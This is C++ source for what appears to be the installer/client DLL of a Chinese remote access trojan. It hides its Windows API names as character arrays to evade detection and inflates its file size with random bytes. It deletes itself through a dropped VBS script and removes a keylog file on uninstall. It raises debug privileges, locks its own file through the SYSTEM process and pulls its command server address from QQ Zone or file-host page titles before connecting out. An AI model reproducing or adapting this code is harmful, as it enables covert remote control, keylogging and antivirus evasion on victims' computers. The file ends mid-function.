// WorkDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <afxwin.h>
#include <tlhelp32.h>
#include <io.h>
#include <Shlobj.h>
#include <shellapi.h>
#include <string.h> 
#include "wininet.h"
#import "msxml2.dll"


#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "Declare.h"		//��̬���ÿ⺯��
#include "Myfunction.h"		//�Զ��庯��
#include "../common/CPub.h"			//�ַ����ָ�

Myfunction *Gyfunction;
//=============================================================
struct ONLINEINFO
{
    CHAR DNS1[100];                                             //����DNS 1
    CHAR DNS2[100];                                             //����DNS 1  QQ����
    CHAR DNS3[100];                                             //����DNS 1  ��������
    WORD Port1;                                                 //���߶˿� 1
    WORD Port2;                                                 //���߶˿� 2
    WORD Port3;                                                 //���߶˿� 3
    CHAR szMark[100];                                           //����汾
}m_OnlineInfo=
{
	"127.0.0.1",
	"425053404",
	"http://xxxx.ys168.com",
	2085,
	2085,
	2085,
	"V_120305"
};

//============================================================

struct SERVERINFO
{
    CHAR ReleacsName[100];                                      //��װ��������
    CHAR ReleasePath[100];                                      //��װ;��
    CHAR ReleaseName[50];                                       //��װ����
    CHAR szGroup[100];                                          //���߷���
    CHAR Mexi[100];                                             //���л���
    BOOL Dele_te;                                               //��װ��ɾ��
    BOOL Dele_zc;                                               //��װ����
    BOOL Dele_zd;                                               //��װ����
    BOOL Dele_fs;                                               //ռ�ӷ�ɾ����װ
    BOOL Dele_Kzj;                                              //K�ս���
}m_ServiceInfo=
{
	"YYYYYYYYYYYY",
	"%ProgramFiles%\\Rumno Qrstuv",
	"SB360.exe",
	"Ĭ�Ϸ���",
	"Cao360",
	0,    //0Ϊ��װ��ɾ��    1Ϊ��װɾ��
	0,    //0Ϊ�����߸���    1Ϊ���װ
	0,    //0Ϊ��װ������    1Ϊ��װ����
	0,    //0Ϊ��ͨ��װ      1Ϊռ�ӷ�ɾ����װ
	0     //0Ϊ��ͬ��װ      1ΪK�ս��߰�װ
};

CHAR ServiceName[100];                                          //��������
CHAR ServicePlay[128];                                          //������ʾ
CHAR ServiceDesc[256];                                          //��������

CHAR HOST[100];                                                 //������ip
WORD PORT;                                                      //�������˿�
UINT HOST_COUNT = 0;											//url����
UINT HOST_INDEX = 0;											//url index


//============================================================

enum
{
	NOT_CONNECT, //  ��û������
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};
char AZname[MAX_PATH]={NULL};  //��װ;��������

static BOOL FuckCracker=TRUE;
DWORD	g_dwServiceType;
VOID MyEncryptFunction(LPSTR szData,WORD Size);
void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpGroupName);  //�޸ķ���
void RunService(char *m_ServPath,char *m_ServiceName,char *m_DisplayName,char *m_Description);  //д�������������
void my_stormRands(CHAR Number,CHAR Data[]);  //��ȡ�������
int StormRand(int count);


//================================================================================================
VOID Wj_OnButtonAdd(LPSTR Path)  //�ļ��Ӵ���  Path �ļ���
{
	int m_Size=15;  //m_Size=10 ����10M
	DWORD dwSize = m_Size * 1024;
	DWORD iSize; 

	char HvnXs01[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs01);
	HANDLE hFile = pCreateFileA
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	if(hFile==INVALID_HANDLE_VALUE)  //ʧ��
		return;
	char Wffkl05[] = {'S','e','t','F','i','l','e','P','o','i','n','t','e','r','\0'};
	SetFilePointerT pSetFilePointer=(SetFilePointerT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl05);
	pSetFilePointer(hFile,0,NULL,FILE_END);

	char Wffkl09[] = {'G','e','t','F','i','l','e','S','i','z','e','\0'};
	GetFileSizeT pGetFileSize=(GetFileSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl09);
    iSize = pGetFileSize(hFile,NULL);        

	char HvnXs02[] = {'W','r','i','t','e','F','i','l','e','\0'};
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs02);
	if((dwSize*1024)>iSize)  //�ж��ļ��Ƿ���� ��ֹ����˳����ε������
	{  
	    DWORD dwBytes=NULL;
	    CHAR Buffer[1024]={NULL};
	    for (DWORD n=0;n<dwSize;n++)
		{
		    if(n%1024==0){
			    for (int x=0;x<1024;x++)
				    Buffer[x]=(rand()+x)%255;    //д�������������
			}
		pWriteFile(hFile,Buffer,1024,&dwBytes,NULL);
		}
	}
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hFile);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

void DeleteMe()   //������ɾ��
{
	HANDLE hFile;
	DWORD dwWritten;

	char Qname[100]={0};
	char cmdline[500]={0};
	char szbuf[256]={0};

	char RdNyz00[] = {'d','i','m',' ','w','s','h','\0'};
	char RdNyz01[] = {'O','n',' ','E','r','r','o','r',' ','R','e','s','u','m','e',' ','N','e','x','t','\0'};
	char RdNyz02[] = {'s','e','t',' ','w','s','h','=','c','r','e','a','t','e','O','b','j','e','c','t','(','"','W','S','c','r','i','p','t','.','S','h','e','l','l','"',')','\0'};
	char RdNyz03[] = {'S','e','t',' ','o','b','j','F','S','O',' ','=',' ','C','r','e','a','t','e','O','b','j','e','c','t','(','"','S','c','r','i','p','t','i','n','g','.','F','i','l','e','S','y','s','t','e','m','O','b','j','e','c','t','"',')','\0'};
	char RdNyz04[] = {'w','s','c','r','i','p','t','.','s','l','e','e','p',' ','1','0','0','0','\0'};
	char RdNyz05[] = {'o','b','j','F','S','O','.','D','e','l','e','t','e','F','i','l','e','(','"','\0'};
	char RdNyz06[] = {'"',')',',',' ','T','r','u','e','\0'};
	char RdNyz07[] = {'c','r','e','a','t','e','o','b','j','e','c','t','(','"','s','c','r','i','p','t','i','n','g','.','f','i','l','e','s','y','s','t','e','m','o','b','j','e','c','t','"',')','.','d','e','l','e','t','e','f','i','l','e',' ','w','s','c','r','i','p','t','.','s','c','r','i','p','t','f','u','l','l','n','a','m','e','\0'};

//dim wsh
//On Error Resume Next
//set wsh=createObject("WScript.Shell")
//Set objFSO = CreateObject("Scripting.FileSystemObject")
//wscript.sleep(1000)
//objFSO.DeleteFile("C:\Documents and Settings\Administrator\����\SB360.exe"), True
//createobject("scripting.filesystemobject").deletefile wscript.scriptfullname


	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateFileA");
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WriteFile");
	char JtQBs02[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JtQBs02);

	char LCoHX03[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A','\0'};
	GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),LCoHX03);
	pGetModuleFileNameA(NULL,szbuf,MAX_PATH);   //���ڻ�ȡ������·��

	Gyfunction->my_sprintf(cmdline,"%s\n\r%s\n\r%s\n\r%s\n\r%s\n\r%s%s%s\n\r%s",RdNyz00,RdNyz01,RdNyz02,RdNyz03,RdNyz04,RdNyz05,szbuf,RdNyz06,RdNyz07);

	int SzName = StormRand(10000);  //�����������
	szbuf[3]='\0';
	Gyfunction->my_sprintf(Qname,"%s%d.vbs",szbuf,SzName); //
	hFile=pCreateFileA(Qname,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	pWriteFile(hFile,(LPCVOID)cmdline,sizeof(cmdline),&dwWritten,NULL);
	pCloseHandle(hFile);

	char DYrEN27[] = {'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
    ShellExecuteAT pShellExecuteA=(ShellExecuteAT)GetProcAddress(LoadLibrary("SHELL32.dll"),DYrEN27);
	pShellExecuteA(NULL,"open",Qname,NULL,NULL,SW_HIDE);

	ExitProcessT pExitProcess=(ExitProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"ExitProcess");
	pExitProcess(NULL);

}


char	strKillEvent[50]={NULL};
//================================================================================================

//ж�ط���˺���
void DelSelf(BOOL FHshanchu)
{
	// ɾ�����߼�¼�ļ�
	char strRecordFile[MAX_PATH];
	char Mstvw01[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	GetSystemDirectoryAT pGetSystemDirectoryA=(GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Mstvw01);
	pGetSystemDirectoryA(strRecordFile, sizeof(strRecordFile));
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	char keylog[] = {'\\','o','u','r','l','o','g','.','d','a','t','\0'};
	plstrcatA(strRecordFile, keylog);
	char QUHZg55[] = {'D','e','l','e','t','e','F','i','l','e','A','\0'};
	DeleteFileAT pDeleteFileA = (DeleteFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),QUHZg55);
	pDeleteFileA(strRecordFile);

	DeleteMe();  //������ɾ��
 }

//========================================================================================
void RaiseToDebugP()  //��Ȩ����  
{  
    HANDLE hToken;  
    char Wffkl01[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0'};
    GetCurrentProcessT pGetCurrentProcess=(GetCurrentProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);
	char CtxPW35[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0'};
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW35);
    HANDLE hProcess = pGetCurrentProcess();  
    if ( pOpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )  
	{  
        TOKEN_PRIVILEGES tkp;  
        char CtxPW34[] = {'L','o','o','k','u','p','P','r','i','v','i','l','e','g','e','V','a','l','u','e','A','\0'};
        LookupPrivilegeValueAT pLookupPrivilegeValueA=(LookupPrivilegeValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW34);
        if ( pLookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid) )  
		{  
            tkp.PrivilegeCount = 1;  
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
     
            char CtxPW33[] = {'A','d','j','u','s','t','T','o','k','e','n','P','r','i','v','i','l','e','g','e','s','\0'};
            AdjustTokenPrivilegesT pAdjustTokenPrivileges=(AdjustTokenPrivilegesT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW33);
            BOOL bREt = pAdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0) ;  
		}  
    char CPolQ19[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
    CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ19);
    pCloseHandle(hToken);  
	}      
}  

BOOL OccupyFile( LPCTSTR lpFileName )  
  {  
      BOOL    bRet;  
      //��������Ȩ��  
    RaiseToDebugP();  
   //��һ��pidΪ4�Ľ��̣�ֻҪ�Ǵ��ڵĽ��̣������� 
	char FBwWp14[] = {'O','p','e','n','P','r','o','c','e','s','s','\0'};
	OpenProcessT pOpenProcess=(OpenProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp14);
    HANDLE hProcess = pOpenProcess( PROCESS_DUP_HANDLE, FALSE, 4);    // 4Ϊsystem���̺�  
     
      if ( hProcess == NULL )  
      {            
          return FALSE;  
      }  
     
      HANDLE hFile;  
      HANDLE hTargetHandle;  
   //�Զ�ռģʽ��Ŀ���ļ�  
	  char Wffkl08[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	  CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl08);
   hFile = pCreateFileA( lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);      

      char CPolQ19[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
      CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ19);
      if ( hFile == INVALID_HANDLE_VALUE )  
      {  
          pCloseHandle( hProcess );  
          return FALSE;  
      }  
     
   //���ļ�������Ƶ�pid=4�Ľ�����ȥ��������ֻҪpid=4�Ľ��̲��˳���˭Ҳ������Ŀ���ļ�  
	  DuplicateHandleT pDuplicateHandle=(DuplicateHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DuplicateHandle");

    char Wffkl01[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0'};
    GetCurrentProcessT pGetCurrentProcess=(GetCurrentProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);
    bRet = pDuplicateHandle( pGetCurrentProcess(), hFile, hProcess, &hTargetHandle,   
          0, FALSE, DUPLICATE_SAME_ACCESS|DUPLICATE_CLOSE_SOURCE);  
     
      pCloseHandle( hProcess );  
     
      return bRet;  
  }  

//==============================================================================
VOID MyCreatDirector(LPSTR Path)   //�����ļ���
{
	
	CHAR Dir[MAX_PATH]={NULL};
	int i;
	CreateDirectoryAT pCreateDirectoryA=(CreateDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateDirectoryA");
	for (i=0;(size_t)i<strlen(Path);i++)
	{
		if(Path[i]=='\\')
		{
			Gyfunction->my_strncpy(Dir,Path,i);
			if(_access(Dir,NULL)==-1)
				pCreateDirectoryA(Dir,NULL);
		}
	}

}

//=============================================================================
void MarkTime(LPCTSTR lpServiceName)  //д�����װʱ����Ϣ
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(strSubKey,JYvni08,lpServiceName);

 	SYSTEMTIME st;
	char FBwWp11[] = {'G','e','t','L','o','c','a','l','T','i','m','e','\0'};
	GetLocalTimeT pGetLocalTime=(GetLocalTimeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp11);
 	pGetLocalTime(&st);
	char sDate[MAX_PATH]={NULL};
	char JYvni06[] = {'%','4','d','-','%','.','2','d','-','%','.','2','d',' ','%','.','2','d',':','%','.','2','d','\0'};
	
	pwsprintfA(sDate, JYvni06, st.wYear,st.wMonth,st.wDay, st.wHour,st.wMinute);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, JYvni04, REG_SZ, (char *)sDate, plstrlenA(sDate), 0);
}

/////////////////////////////////////////////////////////////////////////////////////

char   *substr(char   *str,int   istar,int   iend) 
{  
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 

    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		strcpy(p1,p); 
    else 
    { 
        //p1+=iend; 
		Gyfunction->my_memcpy(p1,p,iend); 
    }
	strcpy(str,p1);
    return   str; 
	
} 

int ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)Gyfunction->my_strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		Gyfunction->my_strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)Gyfunction->my_strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}

char	*lpszQQ = NULL;
BOOL qqonline(LPCTSTR str)    //QQ	����
{
	///////////////////////////////����ip�Ļ�ȡ//////////////////////////////////////

		using namespace MSXML2;//ʹ��msxml2�����ռ�
		CoInitialize(NULL);//��ʼ��com�齨
		
		try
		{
			IXMLHTTPRequestPtr xmlrequest;// ����һ��IXMLHTTPRequestPtr����ָ��
			xmlrequest.CreateInstance("Msxml2.XMLHTTP");//���齨�еõ�����Ľ��,�齨Ҳ���൱��һ������,�����ṩ�˺ܶ�����,����ֻҪ������Ҫ�Ľӿ������ܻ���ĸ�����
			_variant_t varp(false);
			char abc[50]="http://user.qzone.qq.com/";
			strcat(abc,str);
			xmlrequest->open(_bstr_t("GET"),_bstr_t(abc),varp);// ��ʼ���������͵�ͷ����Ϣ
			xmlrequest->send(); // ���͵�������
			BSTR bstrbody;
			xmlrequest->get_responseText(&bstrbody);// ��÷������ķ�����Ϣ
			_bstr_t bstrtbody(bstrbody);// ��bstrbodyǿ��ת����_bstr_t���͵�����

			char	chBuff1[300*1024];    //��ȡ��������  
			strcpy(chBuff1,(LPCTSTR)bstrtbody);
			
			DWORD SizePoint;
			SizePoint = memfind(chBuff1,"<title>",sizeof(chBuff1),0);		//���ҿ�ʼλ��

			substr(chBuff1,SizePoint+8,40);
			
			int i = memfind(chBuff1, "[http", sizeof(chBuff1), 0);		//���ҽ���λ��
			if(i != -1) substr(chBuff1, 1, i);

			ReplaceStr(chBuff1," ","");
			//ReplaceStr(chBuff1,"[","");
			//ReplaceStr(chBuff1,"h","");
			//ReplaceStr(chBuff1,"t","");
			//ReplaceStr(chBuff1,"p","");
			
			lpszQQ=chBuff1;
		}
		catch(...)
		{
			
		}
		CoUninitialize();//����ʼ��com�齨��
		
		return true;
}

char	*lpszWP = NULL;

/////////////////////////////////////////////////////////

BOOL wangpang(LPCTSTR str)   //��������
{
	///////////////////////////////����ip�Ļ�ȡ//////////////////////////////////////
	
		//	 char	lpurl[256]="http://fuck360safe.ys168.com";
		char lpurl[256];
		strcpy(lpurl,str);
		//	 CString strURL;
		// CString strID,strPwd,strPath;
		char	chBuff[300*1024];    //��ȡ��������  
		
		char DYrEN04[] = {'I','n','t','e','r','n','e','t','O','p','e','n','A','\0'};
	    InternetOpenAT pInternetOpenA=(InternetOpenAT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN04);
		DWORD	dwBytesRead=5000;
		HINTERNET	hNet;
		HINTERNET	hFile;
		hNet = pInternetOpenA("Internet Explorer 7.0", 
			
			PRE_CONFIG_INTERNET_ACCESS, NULL, INTERNET_INVALID_PORT_NUMBER, 0);  //��ȡ��ǰ�������Ӿ��
		if (hNet == NULL)   //��ʼ��ʧ��
		{
			return 0;
		}

	    char DYrEN03[] = {'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A','\0'};
	    InternetOpenUrlAT pInternetOpenUrlA=(InternetOpenUrlAT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN03);
		hFile = pInternetOpenUrlA(hNet, 
			lpurl, 
			NULL, 0, 
			INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 
			0);  //��ȡURL���
		if (hFile == NULL)  //û��ȡ��URL���
		{
			return 0;
		}
		memset(chBuff, 0, sizeof(chBuff));	//memset�ڴ��ʼ��

		char HrFvD18[] = {'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0'};
		InternetReadFileT pInternetReadFile=(InternetReadFileT)GetProcAddress(LoadLibrary("WININET.dll"),HrFvD18);
		pInternetReadFile(hFile, chBuff, sizeof(chBuff), &dwBytesRead);
		DWORD SizePoint;
		SizePoint = memfind(chBuff,"<title>",sizeof(chBuff),0);
		
		substr(chBuff,SizePoint+8,15);

		ReplaceStr(chBuff,"<","");
		ReplaceStr(chBuff,"/","");
		ReplaceStr(chBuff,"t","");
		ReplaceStr(chBuff,"i","");
		ReplaceStr(chBuff,"l","");

		lpszWP=chBuff;
		return true;
}

//================================================================================================
void my_ServiceMain()
{
	char Lfrfz02[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
    char FBwWp25[] = {'S','l','e','e','p','\0'};
	SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp25);

	////////////////////////////////////////////////////////////////////////////////////////////////
    //����  �����ظ�����
	char BrmAP29[] = {'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
	CreateEventAT pCreateEventA=(CreateEventAT)GetProcAddress(LoadLibrary(Lfrfz02),BrmAP29);
	pCreateEventA(NULL, FALSE, FALSE,m_ServiceInfo.Mexi);  //���л���

	char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp06);
	ExitProcessT pExitProcess=(ExitProcessT)GetProcAddress(LoadLibrary(Lfrfz02),"ExitProcess");
	if (pGetLastError()==ERROR_ALREADY_EXISTS)
	{
		pSleep(1000);
	    pExitProcess(NULL);  // �˳����г���
	}

//	CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);  //�̸߳���

    ////////////////////////////////////////////////////////////////////////////////////////////////

//	MyEncryptFunction((LPSTR)&m_OnlineInfo,sizeof(ONLINEINFO));  //������Ϣ����

	BOOL	bSuccessful = FALSE;
	BOOL    mconct=FALSE;  //֪ͨ�Ѿ�����
	LPCTSTR lpConnecte[3]={0};  //����
	lpConnects[0]=m_OnlineInfo.DNS1;
	lpConnects[1]=m_OnlineInfo.DNS2;
	lpConnects[2]=m_OnlineInfo.DNS3;
	dwPort[0]=m_OnlineInfo.Port1;
 	dwPort[1]=m_OnlineInfo.Port2;
 	dwPort[2]=m_OnlineInfo.Port3;

	char Lfrfz09[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary(Lfrfz02),Lfrfz09);

	HANDLE	hEvent = NULL;
	//���캯�� ��ʼ��Socket��
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������

	OpenEventAT pOpenEventA=(OpenEventAT)GetProcAddress(LoadLibrary(Lfrfz02),"OpenEventA");

	while (1)
	{
		// �������������ʱ��������sleep1����
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 200; i++)
			{
				hEvent = pOpenEventA(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	                CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary(Lfrfz02),BrmAP29);
					pCloseHandle(hEvent);
					break;
				}
				// ��һ��
				pSleep(200);
			}
		}

		DWORD dwTickCount = pGetTickCount();
		if(nConnect==0)
		{
			//����
			lpConnecte[0] = lpConnects[0];
			if (HOST_INDEX == 0)
			{
				HOST_COUNT = getSplitLen(lpConnecte[0], ';');
			}
			getSplit(lpConnecte[0], ';', HOST_INDEX, HOST);
			PORT = m_OnlineInfo.Port1;

		}
		if(nConnect==1)
		{
			qqonline(lpConnects[1]);    //QQ  ����
			lpConnecte[1]=lpszQQ;
			HOST_COUNT = 1;
			//HOST = lpszQQ;
			strcpy(HOST, lpszQQ);
			PORT = m_OnlineInfo.Port2;
		}
		if(nConnect==2)
		{
			wangpang(lpConnects[2]);    //��������
			lpConnecte[2]=lpszWP;
			HOST_COUNT = 1;
			//HOST = lpszWP;
			strcpy(HOST, lpszWP);
			PORT = m_OnlineInfo.Port3;
		}

        //if (!socketClient.Connect(lpConnecte[nConnect], dwPort[nConnect]))
		if (!socketClient.Connect(HOST, PORT))
		{
			if(mconct!=TRUE)   			//�ж��Ƿ��Ѿ�����
			{
				HOST_INDEX++;
				if (HOST_INDEX >= HOST_COUNT)
				{
					HOST_INDEX = 0;
					nConnect++;
					if(nConnect>=3) nConnect=0;
				}

			}
			mconct=FALSE;  				//����λ��λ
			bBreakError = CONNECT_ERROR;
			continue;
		}

		// ��¼
		DWORD dwExitCode = SOCKET_ERROR;

		sendLoginInfo(ServiceName, &socketClient, pGetTickCount() - dwTickCount,m_OnlineInfo.szMark);
		//CKernelManager	manager(&socketClient,ServiceName, g_dwServiceType, strKillEvent, lpConnecte[nConnect], dwPort[nConnect]);
		CKernelManager	manager(&socketClient,ServiceName, g_dwServiceType, strKillEvent, HOST, PORT);
		socketClient.setManagerCallBack(&manager);
		
		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			pSleep(1000);
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!manager.IsActived())
		{
			nConnect++;
			if(nConnect>=3)
				nConnect=0;
			mconct=TRUE;  //֪ͨ�Ѿ�����
			continue;
		}

		//////////////////////////////////////////////////////////////////////////
		
		DWORD	dwIOCPEvent;
		dwTickCount = pGetTickCount();
	
		do
		{
			hEvent = pOpenEventA(EVENT_ALL_ACCESS, false, strKillEvent);
			char BrmAP30[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
			WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary(Lfrfz02),BrmAP30);
			dwIOCPEvent = pWaitForSingleObject(socketClient.m_hEvent, 100);
			pSleep(500);

		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);
		
		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
			CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary(Lfrfz02),BrmAP29);
			pCloseHandle(hEvent);
			break;
		}
		else
			pSleep(7000);//��ȴ����ƶ��˳�...
	}

	return;
}

VOID MyEncryptFunction(LPSTR szData,WORD Size)
{
	
	//�������������
	WORD AddTable[]={
			3,2,5,8,5,1,2,3,2,5,3,4,1,2,
			4,3,5,8,2,4,5,8,1,2,4,3,1,1,
			8,1,2,4,3,1,1,5,2,2,1,2,1,3,
			5,2,2,1,2,1,3,3,1,2,3,5,2,6,
			2,4,1,3,2,1,2,6,2,3,3,2,1,1,
			3,6,2,1,2,4,4,3,1,2,3,5,2,6,
			3,1,2,3,5,2,6,5,2,2,1,2,1,2,
			6,2,3,3,2,1,1,5,2,2,1,2,1,2,
			3,2,5,3,4,1,2,2,3,1,2,3,5,2
	};
	
	WORD TableSize = sizeof(AddTable)/sizeof(WORD);
	WORD iCount=0;
	FuckCracker=FALSE;
	
	for (WORD i=0;i<Size;i++)
	{
		if(iCount == TableSize) 
			iCount = 0;
		
//		szData[i]^=AddTable[iCount];
		szData[i] = ~((szData[i]^AddTable[iCount])^i);
		//BUG  ����iCount++ ��������������� 3..
		iCount++;
	}
}

/////////////////////////////////////////////////////////////////////////////////////

//�����Ƿ������ǡ����ù���ô�ࡣ��ΪҪдע��Ҳ��֪����ôд����ʽ�ǹ̶���
/*
static BOOL service_is_exist()
{
	char SubKey[MAX_PATH]={0};
	strcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
	strcat(SubKey,m_ServiceInfo.ReleiceName);
	
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
		return TRUE;
	else
		return FALSE;
}
*/

int StormRand(int count)
{
	char LCoHX02[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),LCoHX02);
	unsigned long Time=pGetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}

//============
//static BOOL fDelete_Me=FALSE;
static void RunService(char *m_ServPath,char *m_ServiceName,char *m_DisplayName,char *m_Description)
{

	char FilePath[MAX_PATH];
	char SystemPath[MAX_PATH];
	char LCoHX03[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A','\0'};
	GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),LCoHX03);
	pGetModuleFileNameA(NULL,FilePath,MAX_PATH);   //���ڻ�ȡ������·��
	Gyfunction->my_sprintf(SystemPath,"%s",m_ServPath);

	char sIQkS07[] = {'C','o','p','y','F','i','l','e','A','\0'};
